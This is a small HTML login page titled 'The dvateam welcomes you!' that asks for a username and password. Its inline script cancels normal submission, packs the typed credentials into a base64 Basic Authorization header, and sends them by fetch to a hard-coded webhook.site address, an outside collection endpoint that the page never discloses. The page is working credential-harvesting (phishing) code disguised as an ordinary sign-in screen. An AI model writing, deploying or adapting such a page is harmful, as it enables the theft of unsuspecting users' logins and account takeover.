<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>The dvateam welcomes you!</title>
    <style>
        /* Add CSS for setting the background color to dark grey */
        body {
            background-color: #333; /* Dark grey color */
            color: white; /* Text color */
            font-family: Arial, sans-serif; /* Specify the font */
            text-align: center; /* Center-align text */
        }

        /* Style the button */
        #Button {
            padding: 10px 20px;
            background-color: #007bff; /* Blue color for the button background */
            color: white; /* Text color for the button */
            border: none;
            cursor: pointer;
        }

        /* Style the button on hover */
        #Button:hover {
            background-color: #0056b3; /* Darker blue color on hover */
        }
    </style>
</head>
<body>
  <h1>The dvateam welcomes you!</h1>
    <form id="myForm">
      <input type="text" id="username" placeholder="Username"><br>
      <input type="password" id="password" placeholder="Password"><br>
      <button type="submit">Submit</button>
    </form>

    <script>
    document.getElementById("myForm").addEventListener("submit", function(event) {
  event.preventDefault(); // Prevent the form from submitting by default
  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;
  sendUserDataToWebhook(username, password);
});

function sendUserDataToWebhook(username, password) {
  // Replace with your webhook.site URL
  const webhookUrl = "https://webhook.site/66e989bb-2abe-4004-a229-ed6263865c36";

  // Create a Basic Authentication header
  const headers = new Headers();
  headers.append('Authorization', 'Basic ' + btoa(username + ':' + password));

  // Send an empty POST request (since the data is in the header)
  fetch(webhookUrl, {
    method: "POST",
    headers: headers,
  })
  .then(response => {
    if (!response.ok) {
      throw new Error(`HTTP Error! Status: ${response.status}`);
    }
    return response.json();
  })
  .then(data => {
    // Handle the webhook.site response (if needed)
    console.log("webhook.site response:", data);
  })
  .catch(error => {
    console.error("Error sending data to webhook.site:", error);
  });
}
</script>
  
</body>
</html>
